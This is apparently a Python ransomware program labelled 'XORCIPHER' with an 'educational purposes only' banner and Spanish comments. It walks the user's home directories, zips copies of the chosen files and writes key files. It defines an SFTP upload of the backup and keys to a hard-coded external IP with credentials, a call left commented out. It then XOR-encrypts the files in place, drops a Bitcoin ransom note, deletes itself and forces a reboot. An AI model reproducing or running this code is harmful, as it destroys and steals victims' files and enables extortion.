import os
import random
import platform
import string
import shutil
import paramiko
import time

print("""
 __________          
|XORCIPHER |
|ENCRYPTION|
|PROGRAM   |
|AND       |
|LIBRARY   |
|__________|
      
# This code is for educational purposes only.
    | # <simulates a ransomware on an RCE environment>     
# The authors and maintainers of this code assume NO responsibility.
    | # cibercrimes
    | # data loss
# for any consequences arising from its use.

                                                     
""")

time.sleep(5)


# variables globales del proyecto
user = os.getlogin()
current = os.getcwd()
backup_dir = f"{current}/cipher_backup/"


# genera el token con un valor 'k' personalizado
def generate_token(k_value):
    token = "".join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=k_value))
    return token

# agarra la informacion del sistema
def get_system_info():
    system_info = []
    os_type = platform.system()
    system_info.append(os_type)
    os_arch = platform.machine()
    system_info.append(os_arch)
    os_version = platform.release()
    system_info.append(os_version)
    print(f"OS:{system_info[0]} | Architecture:{system_info[1]} | Version:{system_info[2]} ")
    return system_info

#lista con la informacion basica del sistema
sysinfo = get_system_info()

# crea el relative path en funcion al sistema operativo 
def create_real_path(user):
    if sysinfo[0] == "Linux":
        relative_path = os.path.join(f"/home/{user}")
        return relative_path
    elif sysinfo[0] == "Windows":
        relative_path = os.path.join(f"C:/Users/{user}")
        return relative_path

# string que contiene la ruta relativa en funcion al sistema
relative_path = create_real_path(user)

# agarra los directorios raiz que sean directorios y devuelve una lista con los nombres de los mismos
def get_dirs(relative_path):
    real_dirs_list = []
    for dirs in os.listdir(relative_path):
        if os.path.isdir(f"{relative_path}/{dirs}"):
            if "." not in os.path.join(f"{relative_path}/{dirs}"):
                real_dirs_list.append(dirs)
    return real_dirs_list

# lista con nombre de directorios encontrados
real_dirs_list = get_dirs(relative_path)
#print(real_dirs_list)

# crea un diccionario con el nombre de los directorios y un indice para eleccion de usuario 
def directories_dictionary(real_dirs_list):
    dirs_dict = {}
    for index, found in enumerate(real_dirs_list):
        #print(f"{index}:{found}")
        dirs_dict[index] = found
    return dirs_dict
    
# diccionario con los directorios encontrados y su indice    28
directories_dictionary = directories_dictionary(real_dirs_list)
#print(directories_dictionary)

# agrra la decision del usuario y devuelve la decision como nombre de directorio para buscar los archivos
def get_user_choice(directories_dictionary):
    print("THIS ARE THE DIRECTORIES FOUND ON SYSTEM ")
    for dindex, ddir in directories_dictionary.items():
        print(f"{dindex} > {ddir}")
    
    choice = input("Choose Directory number[or 'A' forr all]:")
    
    while True:
        try:
            if choice == 'A' or choice == 'a':
                if sysinfo[0] == "Linux":
                    print("[+] SELECTED > EVERYTHING")
                    return relative_path
                elif sysinfo[0] == 'Windows':
                    print("[+] SELECTED > EVERYTHING")
                return relative_path
                
            elif choice.isdigit() and int(choice) in directories_dictionary:
                print(f"[+] SELECTED > {directories_dictionary[int(choice)]}")
                return directories_dictionary[int(choice)]
                
            else:
                choice = input("Not an valid option, chose directory number:")
        except ValueError as ve:
            print(ve)
        
# 'directorio' como nombre o '/home' si choice = A/a (linux) o 'C:/users/
user_choice = get_user_choice(directories_dictionary)
#print(user_choice)

# hace un barrido en el directorio seleccionado y crea una lista con los nombres completos de los archivos de cada carpeta del directorio elegido
def get_full_names(relative_path,user_choice,sysinfo):
    full_file_path_list = []
    if user_choice == relative_path:
        print("really all")
        for root,_,files in os.walk(f"{user_choice}"):
            for file in files:
                #print(f"{root}{file}")
                full_file_path_list.append(f"{root}/{file}")
        return full_file_path_list
    else:
        for root,_,files in os.walk(f"{relative_path}/{user_choice}"):
            for file in files:
                if sysinfo[0] == "Linux":
                    #print(f"{root}/{file}")
                    full_file_path_list.append(f"{root}/{file}")
                elif sysinfo[0] == "Windows":
                    full_file_path_list.append(f"{root}/{file}")

        return full_file_path_list

# lista con barrido completo de archivos segun eleccion de directorio
file_path_list = get_full_names(relative_path,user_choice,sysinfo)
#print(file_path_list)
#print(type(file_path_list))

# funcion para crear copia de la carpeta raiz con todo su contenido
def backup_files(source_path,destination_path):
    
    try:
        if not os.path.exists(source_path):
            print("Source path does not exist.")
            return
        
        if os.path.exists(destination_path):
            print("Destination path allready exist")
            return
        
        #copy the full directory to a new destination
        shutil.copytree(source_path,destination_path)
        print(f"Backup > Backup Correctly")
    except Exception as e:
        print(f"An ERROR occured due: {e}")


# llama la funcion de backup en funcion al user_choice
def make_backup(relative_path,user_choice,backup_dir):
    if user_choice == relative_path:
        backup_files(relative_path,backup_dir)
    elif user_choice != relative_path:
        path = f"{relative_path}/{user_choice}"
        backup_files(path,backup_dir)
# crea una copia en el mismo directorio que el codigo
make_backup(relative_path,user_choice,backup_dir)

# funcion para comprimir la carpeta de backup a un archivo 'cipher_backup.zip'    
def compress_backup(current,backup_dir,user):
    try:
        if "Linux" in sysinfo[0]:
            #print("linux")
            os.chdir(current)
            os.system(f"zip -r -5 {user}_cipher_backup.zip cipher_backup")
            shutil.rmtree(backup_dir)
        if "Windows" in sysinfo[0]:
            #print("windows")
            os.chdir(current)
            os.system(f'powershell -Command "Compress-Archive -Path {backup_dir}" -DestinationPath {current}/{user}_cipher_backup.zip""')
            shutil.rmtree(backup_dir)
    except FileNotFoundError as fnfe:
        print(fnfe)
#ejecuta la funcion = comprime la carpeta de backup
compress_backup(current,backup_dir,user)

# para los test, borrar e zip 
#os.remove(f"{current}/cipher_backup.zip")

# crea el diccionario de archivo:clave 
def create_keyfile_dict(file_path_list):
    keyfile_dict = {}
    for file in file_path_list:
        keyfile_dict[file] = generate_token(101)
    return keyfile_dict
# convierte el diccionario a una variable
tokenized_dict = create_keyfile_dict(file_path_list)

# crea el archvio llave de descifrado 
def create_keyfile(tokenized_dict,user):
    with open(f"{user}_decryption_key.py",'w') as file:
        file.write(f"{user}decipher_key = "+"{")
        for filename,key in tokenized_dict.items():                                
            file.write(f"'{filename}':'{key}',")
        file.write("}")
    file.close()
    size = os.path.getsize(f"{current}/{user}_decryption_key.py")
    return size
# crea el archivo 'key' y devuelve el tamano del archivo key como integer
key_size = create_keyfile(tokenized_dict,user)
#print(type(key_size))

# funcion para crear el programa de descifrado singular 
def custom_decipher_file(current,key_size,user,user_choice):
    with open("XORDECIPHER.py",'w') as file:
        if sysinfo[0] == "Windows":
            file.write(f"""

import {user}_decryption_key
import time
import os 
print("WELCOME TO XORCIPHER DECRYPTION PROGRAM")
time.sleep(1)
print("PROCEED AUTO DECRYPTION")
time.sleep(1)
# variable global = diccionario de claves
solution = {user}_decryption_key.{user}decipher_key

# funcion de desencriptar
def decryptor(solution):
    try:                                                                        
        for filename, key in solution.items():
            with open(filename,'rb') as file:
                encrypted_data = file.read()
            key_bytes = bytearray(key,'utf-8')
            decrypted_data = bytearray()
            for i,byte in enumerate(encrypted_data):
                decrypted_data.append(byte ^ key_bytes [i % len(key_bytes)])
            with open(filename,'wb') as sfile:
                sfile.write(decrypted_data)
                print("-- Decrypting Data --")
    except FileNotFoundError:
        print("ERRROR Decrypting > Files does not exist")


# funcion para corroborar el archivo 'key', si lo es procede a desencriptarlo
# caso contrario, no lo desencripta.

def check_keyfile():
    try:
       
        keyfile = r"{current}\{user}_decryption_key.py"
        size = os.path.getsize(keyfile)
        if size == {key_size}:
            print("Is the UNIQUE file")
            print("Proceed decryption")
            decryptor(solution)
            print("YOUR files are RECOVERED")
            time.sleep(1)
            print("Bye, thanks for paying the ransom.")
            time.sleep(1)
        else:
            print("Is not the UNIQUE file, cannot decrypt, ending program...")
    except  SyntaxWarning:
     pass   
check_keyfile()

""")
            file.close()
        elif sysinfo[0] == "Linux":
            file.write(f"""
        
import {user}_decryption_key
import time
import os 
print("WELCOME TO XORCIPHER DECRYPTION PROGRAM")
time.sleep(1)
print("PROCEED AUTO DECRYPTION")
time.sleep(1)
# variable global = diccionario de claves
solution = {user}_decryption_key.{user}decipher_key

# funcion de desencriptar
def decryptor(solution):
    try:                                                                        
        for filename, key in solution.items():
            with open(filename,'rb') as file:
                encrypted_data = file.read()
            key_bytes = bytearray(key,'utf-8')
            decrypted_data = bytearray()
            for i,byte in enumerate(encrypted_data):
                decrypted_data.append(byte ^ key_bytes [i % len(key_bytes)])
            with open(filename,'wb') as sfile:
                sfile.write(decrypted_data)
                print("-- Decrypting Data --")
    except FileNotFoundError:
        print("ERRROR Decrypting > Files does not exist")
    except Syntaxwarning :
        pass


# funcion para corroborar el archivo 'key', si lo es procede a desencriptarlo
# caso contrario, no lo desencripta.

def check_keyfile():
    first_part = f"{current}"
    second_part = f"{user}_decryption_key.py"
    unicode_valid = os.path.join(first_part,second_part)
    keyfile = unicode_valid


    size = os.path.getsize(keyfile)
    if size == {key_size}:
        print("Is the UNIQUE file")
        print("Proceed decryption")
        decryptor(solution)
        print("YOUR files are RECOVERED")
        time.sleep(1)
        print("Bye, thanks for paying the ransom.")
        time.sleep(1)
    else:
        print("Is not the UNIQUE file, cannot decrypt, ending program...")
        
check_keyfile()

""")
            file.close()
    
    

# crea el programa de descifrado'xordecipher.py'
custom_decipher_file(current,key_size,user,user_choice)


# funcion para enviar al servidor el 'backup.zip' y 'decryption_key' y luego borrarlos
def send_sftp(current,user):
    zipfile_path = fr"{current}\{user}_cipher_backup.zip"
    key_filepath = fr"{current}\{user}_decryption_key.py"
    sftp_server = '54.37.204.180'
    sftp_username = 'cipher'
    sftp_password = 'entiadmin'
    time.sleep(.5)
    print("Creating SFTP Connection ...")
    transport = paramiko.Transport((sftp_server, 22))
    # conecta al servidor con las credenciales especificas
    transport.connect(username=sftp_username, password=sftp_password)
    time.sleep(.5)
    print("<Connected>")
    time.sleep(.5)
    print("Creating session..")
    sftp_connection = paramiko.SFTPClient.from_transport(transport)
    time.sleep(.5)
    print("Session successfully created")
    time.sleep(.5)
    print("Creating folder...")
    #intenta crear un directorio en el servidor con el nombre del usuario victima
    shared_folder = f"{user}"
    try:
        sftp_connection.mkdir(shared_folder)
    except FileExistsError:
        pass  
    time.sleep(1)
    print("Folder Created successfully")
    # cambia al directorio creado
    sftp_connection.chdir(shared_folder)
    time.sleep(1)
    print("Preparing to send files ...")
    sftp_connection.put(zipfile_path, os.path.basename(zipfile_path))
    time.sleep(1)
    sftp_connection.put(key_filepath, os.path.basename(key_filepath))
    print("Files Transfered successfully!!!")

    # cierra la conexion con el servidor despues de transferir los archivos
    time.sleep(3)
    print("Closing connection in 3 seconds..")
    sftp_connection.close()
    transport.close()
    time.sleep(1)
    print("Connection closed | Session Closed")
# envia los archivos al servidor
#send_sftp(current,user)

# funcion para borrar los archivos de backup y clave de descifrado
def erase_local_files(current,sysinfo,user):
    if sysinfo[0] == "Linux":
        os.remove(f"{current}/{user}_cipher_backup.zip")
        #os.remove(f"{current}/decryption_key.py")
    elif sysinfo[0] == "Windows":
        zipfile_extension = f"{user}_cipher_backup.zip"
        decryptionfile_extension = f"{user}_decryption_key.py"
        os.remove(fr"{current}\{zipfile_extension}")
        #os.remove(fr"{current}\{decryptionfile_extension}") <<<<<<<<<<<<<<<<<<<< delete or not the key for tests 
# elimina los archivos de backup y descifrado
erase_local_files(current,sysinfo,user)

# funcion para encriptar los archivos del diccionario 'tokenized_dict'
def xor_encrypt(tokenized_dict):
    for filename,key in tokenized_dict.items():
        try:
            with open(filename,"rb") as file:
                data_content = file.read()
            
            key_bytes = bytearray(key, 'utf-8')
            encrypted_data = bytearray()
            for i,byte in enumerate(data_content):
                encrypted_data.append(byte ^ key_bytes[i % len(key_bytes)])
            
            with open(filename, 'wb') as encrypted:
                encrypted.write(encrypted_data)
                print(f"{filename} >> Encrypted ")
        except FileNotFoundError:
            print("ERROR FILE NOT FOUND")
# encripta los archivos de la carpeta seleccionada al principio
xor_encrypt(tokenized_dict)

# funcion para dejar instrucciones en el directorio de ejecucion
def let_instructions(current):
    with open("RECOVER_YOUR_FILES.txt",'w') as file:
        file.write("""
HELLO MY FRIEND, I HOPE YOU FIND YOURSELF WELL BECAUSE I HAVE SOME BAD NEWS FOR YOU..

YEAH . . .  YOUR FILES ARE ENCRYPTED !!

TO RECOVER YOUR FILES, SEND 1000 $ IN BTC TO THE ADDRESS > 'simulated_bitcoin_address'

AFTER THAT SEND A MAIL TO > hacker@hacker.hacker WITH THE TRANSACTION HASH 

AFTER VALIDATION, THE KEY TO DECRYPT YOUR FILES WILL BE SENT TO THE MAIL YOU SENT THE HASH.

HAVE A NICE DAY! =)

REMEMBER : YOU CAN'T DECRYPT YOUR FILES WITHOUT THE SPECIFIC KEY FILE IN THE SAME DIRECTORY AS XORDECIPHER.PY,

ONCE THE KEYFILE IS ON THE SAME DIRECTORY, DECRYPTION PROGRAM WILL WORK ALONE AND CORRECTLY.       
""")
# deja el mensaje 
let_instructions(current)

# funcion para autodestruirse y reiniciar dispositivo
def blackout(current,sysinfo):
    if sysinfo[0] == "Linux":
        os.remove(f"{current}/xorcipher.py")
        os.system("reboot")
    elif sysinfo[0] == "Windows":
        filename = "xorcipher.py"
        os.remove(f"{current}/{filename}")
        os.system("shutdown /r /t 0")
# autodestruccion y reinicio de sistema
blackout(current,sysinfo)









